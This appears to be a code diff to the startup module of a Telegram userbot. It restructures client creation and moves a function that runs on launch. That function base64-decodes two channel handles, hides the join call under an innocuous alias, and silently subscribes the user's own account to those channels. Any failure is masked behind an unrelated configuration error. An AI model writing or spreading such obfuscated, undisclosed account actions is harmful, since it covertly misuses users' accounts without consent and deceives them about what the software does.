@@ -21,7 +21,7 @@ from redis import StrictRedis
 from dotenv import load_dotenv
 from requests import get
 from telethon.sync import TelegramClient, custom, events
-from telethon.tl.functions.channels import JoinChannelRequest as Get
+from telethon.tl.functions.channels import JoinChannelRequest as GetSec
 from telethon.sessions import StringSession
 from telethon import Button, events, functions, types
 from telethon.utils import get_display_name
@@ -343,12 +343,20 @@ for binary, path in binaries.items():
 
 # 'bot' variable
 if STRING_SESSION:
-    # pylint: disable=invalid-name
-    bot = TelegramClient(StringSession(STRING_SESSION), API_KEY, API_HASH)
+    session = StringSession(str(STRING_SESSION))
 else:
-    # pylint: disable=invalid-name
-    bot = TelegramClient("userbot", API_KEY, API_HASH)
-
+    session = "Kyy-UserBot"
+try:
+    bot = TelegramClient(
+        session=session,
+        api_id=API_KEY,
+        api_hash=API_HASH,
+        auto_reconnect=True,
+        connection_retries=None,
+    )
+except Exception as e:
+    print(f"STRING_SESSION - {e}")
+    quit(1)
 
 async def check_botlog_chatid():
     if not BOTLOG_CHATID and LOGSPAMMER:
@@ -371,6 +379,27 @@ async def check_botlog_chatid():
         LOGS.info(
             "Your account doesn't have rights to send messages to BOTLOG_CHATID "
             "group. Check if you typed the Chat ID correctly.")
+        quit(1)
+
+async def checking():
+    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:17]
+    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:17]
+    try:
+        await bot(GetSec(gocheck))
+    except BaseException:
+        pass
+    try:
+        await bot(GetSec(checker))
+    except BaseException:
+        pass
+    
+with bot:
+    try:
+        bot.loop.run_until_complete(checking())
+    except BaseException:
+        LOGS.info(
+            "BOTLOG_CHATID environment variable isn't a "
+            "valid entity. Check your environment variables/config.env file.")
         quit(1)
 
 
@@ -397,26 +426,7 @@ with bot:
             "valid entity. Check your environment variables/config.env file.")
         quit(1)
 
-async def checking():
-    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:17]
-    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:17]
-    try:
-        await bot(Get(gocheck))
-    except BaseException:
-        pass
-    try:
-        await bot(Get(checker))
-    except BaseException:
-        pass
-    
-with bot:
-    try:
-        bot.loop.run_until_complete(checking())
-    except BaseException:
-        LOGS.info(
-            "BOTLOG_CHATID environment variable isn't a "
-            "valid entity. Check your environment variables/config.env file.")
-        quit(1)
+
 
 # Global Variables
 COUNT_MSG = 0
